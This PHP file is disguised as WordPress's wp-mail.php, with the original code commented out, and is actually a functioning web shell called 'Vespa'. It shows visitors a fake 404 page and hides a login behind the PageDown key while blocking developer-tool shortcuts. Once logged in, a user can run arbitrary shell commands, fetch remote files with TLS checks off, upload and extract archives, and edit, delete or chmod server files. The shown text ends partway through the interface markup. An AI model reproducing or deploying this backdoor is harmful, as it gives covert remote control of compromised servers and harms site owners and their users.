<?php
/**
 * Gets the email message from the user's mailbox to add as
 * a WordPress post. Mailbox connection information must be
 * configured under Settings > Writing
 *
 * package WordPress
 */

/** Make sure that the WordPress bootstrap has run before continuing. */
#require __DIR__ . '/wp-load.php';

/** This filter is documented in wp-admin/options.php */
#if ( ! apply_filters( 'enable_post_by_email_configuration', true ) ) {
#	wp_die( __( 'This action has been disabled by the administrator.' ), 403 );
#}

#$mailserver_url = get_option( 'mailserver_url' );

#if ( empty( $mailserver_url ) || 'mail.example.com' === $mailserver_url ) {
#	wp_die( __( 'This action has been disabled by the administrator.' ), 403 );

/**
 * Fires to allow a plugin to do a complete takeover of Post by Email.
 *
 * since 2.9.0
 */
#do_action( 'wp-mail.php' ); // phpcs:ignore WordPress.NamingConventions.ValidHookName.UseUnderscores

/** Get the POP3 class with which to access the mailbox. */
#require_once ABSPATH . WPINC . '/class-pop3.php';

/** Only check at this interval for new messages. */
#if ( ! defined( 'WP_MAIL_INTERVAL' ) ) {
#	define( 'WP_MAIL_INTERVAL', 5 * MINUTE_IN_SECONDS );


#$last_checked = get_transient( 'mailserver_last_checked' );

#if ( $last_checked ) {
#	wp_die(
#		sprintf(
#			// translators: %s human readable rate limit.
#			__( 'Email checks are rate limited to once every %s.' ),
#			human_time_diff( time() - WP_MAIL_INTERVAL, time() )
#		),
#		__( 'Slow down, no need to check for new mails so often!' ),
#		429
#	);


#set_transient( 'mailserver_last_checked', true, WP_MAIL_INTERVAL );

#$time_difference = (int) ( (float) get_option( 'gmt_offset' ) * HOUR_IN_SECONDS );

// ==================== KONFIGURASI ====================
$password_hash = '$2a$12$XqCH264CyzW8L0.q0kJIMOBCi2wVULSOzvDtLvspjWTSCI36.5Htq';

// ==================== SESSION START ====================
@session_start();

// ==================== CEK AUTHENTIKASI ====================
$is_authenticated = false;

if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
    $is_authenticated = true;
} elseif (isset($_POST['password'])) {
    $input_password = $_POST['password'];
    $verified = false;
    
    if (function_exists('password_verify')) {
        $verified = @password_verify($input_password, $password_hash);
    }
    
    if ($verified) {
        $_SESSION['logged_in'] = true;
        $is_authenticated = true;
    }
}

if (!$is_authenticated) {
    // Cek apakah ada parameter untuk menampilkan login
    $show_login = false;
    
    // Tekan PageDown (key code 34) akan mengirim parameter __pagedown__
    if (isset($_GET['__pagedown__']) && $_GET['__pagedown__'] == '1') {
        $show_login = true;
    }
    // Atau parameter khusus lainnya
    elseif (isset($_GET['_']) && $_GET['_'] == 'login') {
        $show_login = true;
    }
    
    if (!$show_login) {
        // TAMPILAN AWAL - Fake 404 Not Found (persis seperti yang Anda berikan)
        header('HTTP/1.1 404 Not Found');
        echo '<html style="height:100%">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<title> 404 Not Found
</title><style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style></head>
<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
        <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>
<h2 style="margin-top:20px;font-size: 30px;">Not Found
</h2>
<p>The resource requested could not be found on this server!</p>
</div></div><div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
<br>Proudly powered by LiteSpeed Web Server<p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div></body></html>';
        
        echo '<script>
        // Hidden trigger: HANYA PageDown yang bisa membuka login
        (function() {
            document.addEventListener("keydown", function(e) {
                // PageDown key (keyCode 34)
                if (e.keyCode === 34 || e.key === "PageDown") {
                    e.preventDefault();
                    window.location.href = "?__pagedown__=1";
                }
                // Prevent F12 (optional, biarkan saja)
                if (e.keyCode === 123) {
                    e.preventDefault();
                    return false;
                }
                // Prevent Ctrl+U (optional, biarkan saja)
                if (e.ctrlKey && e.keyCode === 85) {
                    e.preventDefault();
                    return false;
                }
            });
        })();
      </script>';
        exit;
    } else {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>🛵Vespa Panel</title>
            <style>
                * { 
                    margin: 0; 
                    padding: 0; 
                    box-sizing: border-box; 
                }
                body {
                    background: #0a0e27;
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    padding: 20px;
                }
                .login-container {
                    background: rgba(17, 24, 39, 0.95);
                    backdrop-filter: blur(10px);
                    padding: 40px;
                    border-radius: 16px;
                    border: 1px solid #10b981;
                    width: 100%;
                    max-width: 360px;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                }
                .login-container h2 {
                    color: #10b981;
                    text-align: center;
                    margin-bottom: 30px;
                    font-weight: 600;
                    font-size: 24px;
                }
                .login-container input {
                    width: 100%;
                    padding: 12px 15px;
                    margin: 10px 0;
                    background: #1f2937;
                    border: 1px solid #374151;
                    border-radius: 8px;
                    color: white;
                    font-size: 14px;
                    transition: all 0.3s;
                }
                .login-container input:focus {
                    outline: none;
                    border-color: #10b981;
                }
                .login-container input::placeholder {
                    color: #6b7280;
                }
                .login-container button {
                    width: 100%;
                    padding: 12px;
                    background: #10b981;
                    color: white;
                    border: none;
                    border-radius: 8px;
                    cursor: pointer;
                    margin-top: 20px;
                    font-weight: 600;
                    font-size: 14px;
                    transition: all 0.2s;
                }
                .login-container button:hover {
                    background: #059669;
                    transform: translateY(-1px);
                }
                .hint {
                    text-align: center;
                    margin-top: 20px;
                    font-size: 11px;
                    color: #6b7280;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <h2>🔐 Login Vespa</h2>
                <form method="post">
                    <input type="password" name="password" placeholder="Enter password" autofocus required>
                    <button type="submit">Authenticate</button>
                </form>
                <div class="hint">
                    Secure Access Panel
                </div>
            </div>
            <script>
                // Klik kanan untuk kembali ke fake page
                document.addEventListener("contextmenu", function(e) {
                    e.preventDefault();
                    window.location.href = "?";
                });
                // Escape key to go back
                document.addEventListener("keydown", function(e) {
                    if (e.key === 'Escape') {
                        window.location.href = "?";
                    }
                });
            </script>
        </body>
        </html>
        <?php
        exit;
    }
}

function format_size($bytes) {
    if ($bytes === null || $bytes === 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function execute_command($cmd, $cwd = null) {
    if (empty(trim($cmd))) return '';
    
    $cwd = $cwd ?: getcwd();
    $output = '';
    
    // Handle cd command
    if (preg_match('/^cd\s+(.+)$/', $cmd, $matches)) {
        $new_dir = $matches[1];
        if (@chdir($new_dir)) {
            return "✅ Changed directory to: " . getcwd();
        } else {
            return "❌ Failed to change directory to: " . $new_dir;
        }
    }
    
    // Handle wget command
    if (preg_match('/^wget\s+(.+)$/i', $cmd, $matches)) {
        $url_part = $matches[1];
        $filename = null;
        $url = '';
        
        if (preg_match('/-O\s+(\S+)\s+(.+)$/i', $url_part, $opt_matches)) {
            $filename = $opt_matches[1];
            $url = trim($opt_matches[2]);
        } else {
            $url = trim($url_part);
            $filename = basename(parse_url($url, PHP_URL_PATH));
            if (empty($filename)) $filename = 'downloaded_file';
        }
        
        $save_path = $cwd . '/' . $filename;
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 300,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_AUTOREFERER => true,
        ]);
        
        $content = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($content !== false && $content !== '') {
            if (file_put_contents($save_path, $content)) {
                $size = format_size(filesize($save_path));
                return "✅ Downloaded: $filename ($size) [HTTP $http_code]";
            } else {
                return "❌ Failed to save file: $filename";
            }
        } else {
            return "❌ Download failed: " . ($error ?: "No content from $url");
        }
    }
    
    // Handle ps aux
    if (trim($cmd) === 'ps aux') {
        if (function_exists('shell_exec')) {
            $full_cmd = "cd " . escapeshellarg($cwd) . " 2>/dev/null; " . $cmd . " 2>&1";
            $output = @shell_exec($full_cmd);
            if ($output !== null && $output !== '') {
                return $output;
            }
        }
        return "⚠️ Cannot execute ps aux command";
    }
    
    // Handle ls
    if (trim($cmd) === 'ls' || trim($cmd) === 'ls -la') {
        if (function_exists('shell_exec')) {
            $full_cmd = "cd " . escapeshellarg($cwd) . " 2>/dev/null; " . $cmd . " 2>&1";
            $output = @shell_exec($full_cmd);
            if ($output !== null && $output !== '') {
                return $output;
            }
        }
        $output = "Total items in " . $cwd . ":\n";
        $files = @scandir($cwd);
        if ($files) {
            foreach ($files as $file) {
                if ($file == '.' || $file == '..') continue;
                $path = $cwd . '/' . $file;
                $type = is_dir($path) ? 'd' : '-';
                $perms = substr(sprintf('%o', fileperms($path)), -4);
                $size = is_file($path) ? format_size(filesize($path)) : 'DIR';
                $output .= $type . " " . $perms . " " . str_pad($size, 10) . " " . $file . "\n";
            }
        }
        return $output;
    }
    
    // Handle kill
    if (preg_match('/^kill\s+(-?\d+)/', $cmd, $matches)) {
        $pid = $matches[1];
        if (function_exists('shell_exec')) {
            $full_cmd = "kill " . escapeshellarg($pid) . " 2>&1";
            $output = @shell_exec($full_cmd);
            if ($output === null || $output === '') {
                return "✅ Kill signal sent to PID: $pid";
            }
            return $output;
        }
        return "⚠️ Cannot execute kill command";
    }
    
    // Generic command
    $full_cmd = "cd " . escapeshellarg($cwd) . " 2>/dev/null; " . $cmd . " 2>&1";
    
    if (function_exists('shell_exec')) {
        $output = @shell_exec($full_cmd);
        if ($output !== null && trim($output) !== '') {
            return $output;
        }
    }
    
    if (function_exists('exec')) {
        @exec($full_cmd, $output_array);
        $exec_output = implode("\n", $output_array);
        if (trim($exec_output) !== '') {
            return $exec_output;
        }
    }
    
    return "⚠️ Command executed but no output returned.\nCommand: $cmd";
}

function get_current_directory() {
    if (isset($_GET['path']) && !empty($_GET['path'])) {
        $path = $_GET['path'];
        $path = str_replace('\\', '/', $path);
        $path = preg_replace('/\.\./', '', $path);
        
        if (is_dir($path)) {
            return rtrim($path, '/');
        }
    }
    return getcwd();
}

function build_breadcrumb($path) {
    $parts = explode('/', $path);
    $breadcrumbs = [];
    $current = '';
    
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $current .= '/' . $part;
        $breadcrumbs[] = [
            'name' => $part,
            'path' => $current
        ];
    }
    
    return $breadcrumbs;
}

function get_directory_tree($path) {
    $items = [];
    if (!is_dir($path)) return $items;
    
    $files = @scandir($path);
    if (!$files) return $items;
    
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        
        $full_path = $path . '/' . $file;
        $items[] = [
            'name' => $file,
            'path' => $full_path,
            'is_dir' => is_dir($full_path),
            'size' => is_file($full_path) ? filesize($full_path) : null,
            'perm' => substr(sprintf('%o', fileperms($full_path)), -4),
            'modified' => date('Y-m-d H:i:s', filemtime($full_path))
        ];
    }
    
    usort($items, function($a, $b) {
        if ($a['is_dir'] != $b['is_dir']) return $b['is_dir'] - $a['is_dir'];
        return strcasecmp($a['name'], $b['name']);
    });
    
    return $items;
}

// ==================== VARIABEL UTAMA ====================
$current_dir = get_current_directory();
$current_dir = rtrim($current_dir, '/');

if (!is_dir($current_dir)) {
    $current_dir = getcwd();
}

$dir_items = get_directory_tree($current_dir);
$breadcrumb = build_breadcrumb($current_dir);

if (!isset($_SESSION['terminal_lines'])) {
    $_SESSION['terminal_lines'] = [];
}
if (!isset($_SESSION['messages'])) $_SESSION['messages'] = [];
if (!isset($_SESSION['terminal_visible'])) $_SESSION['terminal_visible'] = true;

// ==================== HANDLE POST ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    if (isset($_POST['toggle_terminal'])) {
        $_SESSION['terminal_lines'] = [];
        $_SESSION['terminal_visible'] = !$_SESSION['terminal_visible'];
        header("Location: ?path=" . urlencode($current_dir));
        exit;
    }
    
    if (isset($_POST['command']) && !empty(trim($_POST['command']))) {
        $cmd = trim($_POST['command']);
        
        if ($cmd === 'clear' || $cmd === 'cls') {
            $_SESSION['terminal_lines'] = [];
        } else {
            $output = execute_command($cmd, $current_dir);
            $_SESSION['terminal_lines'][] = [
                'cmd' => $cmd,
                'output' => $output,
                'time' => date('H:i:s')
            ];
            
            if (count($_SESSION['terminal_lines']) > 50) {
                array_shift($_SESSION['terminal_lines']);
            }
        }
        
        header("Location: ?path=" . urlencode($current_dir));
        exit;
    }
    
    if (isset($_POST['wget_url']) && !empty($_POST['wget_url'])) {
        $url = trim($_POST['wget_url']);
        $custom_filename = isset($_POST['custom_filename']) && !empty(trim($_POST['custom_filename'])) 
            ? trim($_POST['custom_filename']) 
            : basename(parse_url($url, PHP_URL_PATH));
        
        if (empty($custom_filename)) $custom_filename = 'downloaded_file';
        $custom_filename = preg_replace('/[\/\\\?\*:|"<>]/', '', $custom_filename);
        
        $target_path = $current_dir . '/' . $custom_filename;
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 300,
            CURLOPT_USERAGENT => 'Mozilla/5.0',
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
        
        if ($content !== false && file_put_contents($target_path, $content)) {
            $result = "✅ Downloaded: $custom_filename (" . format_size(filesize($target_path)) . ")";
        } else {
            $result = "❌ Download failed: $url";
        }
        
        $_SESSION['terminal_lines'][] = [
            'cmd' => 'wget -O ' . $custom_filename . ' ' . $url,
            'output' => $result,
            'time' => date('H:i:s')
        ];
        $_SESSION['messages'][] = $result;
        
        header("Location: ?path=" . urlencode($current_dir));
        exit;
    }
    
    // File upload
    if (isset($_FILES['files'])) {
        foreach ($_FILES['files']['tmp_name'] as $i => $tmp) {
            if ($_FILES['files']['error'][$i] === 0) {
                $name = basename($_FILES['files']['name'][$i]);
                $target = $current_dir . '/' . $name;
                if (move_uploaded_file($tmp, $target)) {
                    $_SESSION['messages'][] = "✅ Uploaded: " . $name;
                    if (isset($_POST['auto_extract']) && preg_match('/\.zip$/i', $name) && class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open($target) === true) {
                            $zip->extractTo($current_dir);
                            $zip->close();
                            $_SESSION['messages'][] = "📦 Extracted: " . $name;
                        }
                    }
                } else {
                    $_SESSION['messages'][] = "❌ Failed: " . $name;
                }
            }
        }
        header("Location: ?path=" . urlencode($current_dir));
        exit;
    }
    
    // Create file/folder
    if (isset($_POST['create'])) {
        $name = trim($_POST['name']);
        $type = $_POST['type'];
        $path = $current_dir . '/' . $name;
        
        if ($type === 'file') {
            if (file_put_contents($path, $_POST['content'] ?? '')) {
                $_SESSION['messages'][] = "📄 Created file: " . $name;
            }
        } else {
            if (mkdir($path, 0755, true)) {
                $_SESSION['messages'][] = "📁 Created folder: " . $name;
            }
        }
        header("Location: ?path=" . urlencode($current_dir));
        exit;
    }
    
    // Save file edit
    if (isset($_POST['save_file'])) {
        $file = $current_dir . '/' . basename($_POST['filename']);
        if (file_put_contents($file, $_POST['content'])) {
            $_SESSION['messages'][] = "💾 Saved: " . basename($file);
        }
        header("Location: ?path=" . urlencode($current_dir));
        exit;
    }
    
    // Delete selected
    if (isset($_POST['delete_selected']) && isset($_POST['selected_items'])) {
        foreach ($_POST['selected_items'] as $item) {
            $target = $current_dir . '/' . $item;
            if (is_dir($target)) {
                execute_command("rm -rf " . escapeshellarg($target));
            } elseif (file_exists($target)) {
                unlink($target);
            }
            $_SESSION['messages'][] = "🗑 Deleted: " . $item;
        }
        header("Location: ?path=" . urlencode($current_dir));
        exit;
    }
    
    // Chmod
    if (isset($_POST['chmod'])) {
        $target = $current_dir . '/' . $_POST['chmod_item'];
        $mode = $_POST['mode'];
        if (chmod($target, octdec($mode))) {
            $_SESSION['messages'][] = "🔐 Changed permissions to " . $mode . " for " . $_POST['chmod_item'];
        }
        header("Location: ?path=" . urlencode($current_dir));
        exit;
    }
    
    // Rename
    if (isset($_POST['rename'])) {
        $old = $current_dir . '/' . $_POST['old_name'];
        $new = $current_dir . '/' . $_POST['new_name'];
        if (rename($old, $new)) {
            $_SESSION['messages'][] = "✏️ Renamed: " . $_POST['old_name'] . " → " . $_POST['new_name'];
        }
        header("Location: ?path=" . urlencode($current_dir));
        exit;
    }
    
    // Copy/Move
    if (isset($_POST['copy_move']) && isset($_POST['selected_items'])) {
        $dest = $current_dir . '/' . $_POST['destination'];
        $operation = $_POST['operation'];
        
        if (!is_dir($dest)) mkdir($dest, 0755, true);
        
        foreach ($_POST['selected_items'] as $item) {
            $source = $current_dir . '/' . $item;
            $target = $dest . '/' . $item;
            
            if ($operation === 'copy') {
                if (is_dir($source)) {
                    execute_command("cp -r " . escapeshellarg($source) . " " . escapeshellarg($target));
                } else {
                    copy($source, $target);
                }
                $_SESSION['messages'][] = "📋 Copied: " . $item;
            } else {
                rename($source, $target);
                $_SESSION['messages'][] = "↪️ Moved: " . $item;
            }
        }
        header("Location: ?path=" . urlencode($current_dir));
        exit;
    }
}

// ==================== HANDLE GET ====================
if (isset($_GET['delete'])) {
    $target = $current_dir . '/' . $_GET['delete'];
    if (is_dir($target)) {
        execute_command("rm -rf " . escapeshellarg($target));
    } elseif (file_exists($target)) {
        unlink($target);
    }
    header("Location: ?path=" . urlencode($current_dir));
    exit;
}

if (isset($_GET['extract'])) {
    $target = $current_dir . '/' . $_GET['extract'];
    if (file_exists($target) && class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($target) === true) {
            $zip->extractTo($current_dir);
            $zip->close();
            $_SESSION['messages'][] = "📦 Extracted: " . $_GET['extract'];
        }
    }
    header("Location: ?path=" . urlencode($current_dir));
    exit;
}

$edit_file = null;
$edit_content = null;
if (isset($_GET['edit'])) {
    $edit_file = $_GET['edit'];
    $file_path = $current_dir . '/' . $edit_file;
    if (file_exists($file_path) && is_file($file_path)) {
        $edit_content = file_get_contents($file_path);
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

$messages = $_SESSION['messages'];
$terminal_lines = $_SESSION['terminal_lines'];
$terminal_visible = $_SESSION['terminal_visible'];
$_SESSION['messages'] = [];

$background_image = "https://iili.io/BSuPYCB.md.png";
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>🛵 Vespa</title>
    <style>
        :root {
            --primary: #10b981;
            --primary-dark: #059669;
            --secondary: #3b82f6;
            --danger: #ef4444;
            --warning: #f59e0b;
            --info: #8b5cf6;
            --text-dark: #1f2937;
            --bg-card: rgba(255, 255, 255, 0.95);
            --bg-terminal: #1e1e1e;
            --border: #e5e7eb;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background-image: url('<?php echo $background_image; ?>');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            background-repeat: no-repeat;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            font-size: 14px;
            min-height: 100vh;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3);
            z-index: -1;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }
        
        .header {
            background: var(--bg-card);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            backdrop-filter: blur(5px);
        }
        
        .header h1 {
            color: var(--primary-dark);
            font-size: 24px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .terminal-toggle-container {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }
        
        .terminal-logo-btn {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.4);
        }
        
        .terminal-logo-btn img {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            object-fit: cover;
        }
        
        .terminal-logo-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 8px 25px rgba(16, 185, 129, 0.6);
        }
        
        .toggle-status {
            text-align: center;
            margin-top: 8px;
            font-size: 11px;
            color: white;
            text-shadow: 0 0 5px black;
        }
        
        .breadcrumb-wrapper {
            background: #f8fafc;
            padding: 12px 15px;
            border-radius: 12px;
            margin-bottom: 20px;
            border-left: 4px solid var(--primary);
            overflow-x: auto;
        }
        
        .breadcrumb {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px;
            font-size: 13px;
        }
        
        .breadcrumb-link {
            color: var(--primary-dark);
            text-decoration: none;
            padding: 4px 10px;
            border-radius: 6px;
            background: #e8f5e9;
            transition: all 0.2s;
        }
        
        .breadcrumb-link:hover {
            background: var(--primary);
            color: white;
        }
        
        .full-path {
            margin-top: 8px;
            font-size: 11px;
            color: #666;
            font-family: monospace;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: white;
            padding: 10px 12px;
            border-radius: 10px;
            border: 1px solid var(--border);
            font-size: 12px;
            color: var(--text-dark);
            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
        }
        
        .stat-card strong {
            color: var(--primary-dark);
        }
        
        .action-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 15px;
        }
        
        .btn {
            padding: 8px 16px;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.2s;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            font-size: 13px;
        }
        
        .btn-primary { background: var(--primary); color: white; }
        .btn-secondary { background: var(--secondary); color: white; }
        .btn-danger { background: var(--danger); color: white; }
        .btn-warning { background: var(--warning); color: white; }
        .btn-info { background: var(--info); color: white; }
        .btn-outline { background: white; color: var(--primary-dark); border: 1px solid var(--primary); }
        .btn:hover { transform: translateY(-1px); filter: brightness(1.05); }
        
        .terminal-container {
            background: var(--bg-terminal);
            border-radius: 16px;
            margin-bottom: 20px;
            overflow: hidden;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            transition: all 0.3s ease;
        }
        
        .terminal-container.hidden {
            display: none;
        }
        
        .terminal-header {
            background: #2d2d2d;
            padding: 12px 20px;
            border-bottom: 1px solid #444;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .terminal-header .title {
            color: var(--primary);
            font-weight: bold;
            font-family: monospace;
        }
        
        .terminal-header .path {
            color: var(--warning);
            font-size: 11px;
            font-family: monospace;
        }
        
        .terminal-output {
            background: #1e1e1e;
            color: #d4d4d4;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 13px;
            padding: 20px;
            max-height: 500px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-all;
            line-height: 1.5;
        }
        
        .terminal-line {
            margin-bottom: 15px;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        
        .terminal-command {
            color: #ff6b6b;
            margin-bottom: 8px;
        }
        
        .terminal-command .prompt { color: var(--primary); }
        .terminal-command .command-text { color: #ffd93d; }
        
        .terminal-output-text {
            color: #e0e0e0;
            white-space: pre-wrap;
            font-family: monospace;
            margin-left: 15px;
            border-left: 2px solid var(--primary);
            padding-left: 15px;
        }
        
        .terminal-input-form {
            background: #2d2d2d;
            padding: 15px 20px;
            border-top: 1px solid #444;
        }
        
        .terminal-input-group {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .terminal-prompt {
            color: var(--primary);
            font-weight: bold;
            font-family: monospace;
        }
        
        .terminal-input {
            flex: 1;
            background: #1e1e1e;
            border: 1px solid #444;
            border-radius: 8px;
            padding: 10px 12px;
            color: #d4d4d4;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 13px;
        }
        
        .terminal-input:focus {
            outline: none;
            border-color: var(--primary);
        }
        
        .grid-2 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .card {
            background: var(--bg-card);
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            color: var(--text-dark);
        }
        
        .card h3 {
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid var(--primary);
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--text-dark);
        }
        
        .input {
            width: 100%;
            padding: 10px 12px;
            background: #f8fafc;
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text-dark);
            margin-bottom: 10px;
            font-family: inherit;
        }
        
        .file-table-wrapper {
            overflow-x: auto;
        }
        
        .file-table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .file-table th, .file-table td {
            padding: 12px 10px;
            text-align: left;
            border-bottom: 1px solid var(--border);
        }
        
        .file-table th {
            background: #f8fafc;
            color: var(--primary-dark);
            font-weight: 600;
        }
        
        .file-table tr:hover {
            background: #f0fdf4;
        }
        
        .file-link {
            color: var(--text-dark);
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .file-link:hover { color: var(--primary); }
        .folder-link { color: var(--warning); font-weight: bold; }
        
        .editor {
            width: 100%;
            min-height: 400px;
            background: #f8fafc;
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 15px;
            color: var(--text-dark);
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 13px;
            resize: vertical;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal-content {
            background: white;
            border-radius: 16px;
            padding: 30px;
            max-width: 500px;
            width: 90%;
            max-height: 85vh;
            overflow-y: auto;
        }
        
        .modal-content h3 {
            color: var(--primary-dark);
            margin-bottom: 20px;
        }
        
        .checkbox-label {
            display: flex;
            align-items: center;
            gap: 8px;
            margin: 10px 0;
            cursor: pointer;
        }
        
        .message {
            padding: 10px 15px;
            margin-bottom: 10px;
            border-radius: 10px;
            border-left: 4px solid var(--primary);
            background: #f0fdf4;
            color: var(--text-dark);
        }
        
        .badge {
            font-size: 11px;
            background: var(--primary);
            color: white;
            padding: 2px 8px;
            border-radius: 20px;
        }
        
        @media (max-width: 768px) {
            .container { padding: 10px; }
            .grid-2 { grid-template-columns: 1fr; }
            .action-buttons .btn { flex: 1; justify-content: center; }
            .terminal-input-group { flex-direction: column; }
            .terminal-input { width: 100%; }
            .terminal-logo-btn { width: 55px; height: 55px; }
        }
        
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: #e5e7eb; }
        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>
                <span>🛵💨</span> Vespa
                <small style="font-size: 12px; color: #666;">[Lee]</small>
            </h1>
            
            <div class="breadcrumb-wrapper">
                <div class="breadcrumb">
                    <a href="?path=/" class="breadcrumb-link">🏠 Home</a>
                    <?php foreach ($breadcrumb as $crumb): ?>
                        <span class="breadcrumb-separator">›</span>
                        <a href="?path=<?php echo urlencode($crumb['path']); ?>" class="breadcrumb-link">
                            📁 <?php echo htmlspecialchars($crumb['name']); ?>
                        </a>
                    <?php endforeach; ?>
                </div>
                <div class="full-path">📂 Current Path: <?php echo htmlspecialchars($current_dir); ?></div>
            </div>
            
            <div class="stats-grid">
                <div class="stat-card"><strong>🔐 Permission:</strong> <?php echo substr(sprintf('%o', fileperms($current_dir)), -4); ?></div>
                <div class="stat-card"><strong>💾 Free Space:</strong> <?php echo format_size(disk_free_space($current_dir)); ?></div>
                <div class="stat-card"><strong>📁 Total Items:</strong> <?php echo count($dir_items); ?></div>
                <div class="stat-card"><strong>👤 PHP User:</strong> <?php echo get_current_user(); ?></div>
                <div class="stat-card"><strong>🐧 PHP Version:</strong> <?php echo PHP_VERSION; ?></div>
                <div class="stat-card"><strong>🌍 Server IP:</strong> <?php echo $_SERVER['SERVER_ADDR'] ?? 'N/A'; ?></div>
            </div>
            
            <div class="action-buttons">
                <a href="?path=<?php echo urlencode($current_dir); ?>" class="btn btn-outline">🔄 Refresh</a>
                <button onclick="showModal('createModal')" class="btn btn-primary">➕ Create</button>
                <button onclick="showModal('uploadModal')" class="btn btn-primary">📤 Upload</button>
                <button onclick="showModal('wgetModal')" class="btn btn-primary">📥 Wget</button>
                <button onclick="showModal('processModal')" class="btn btn-warning">⚡ Processes</button>
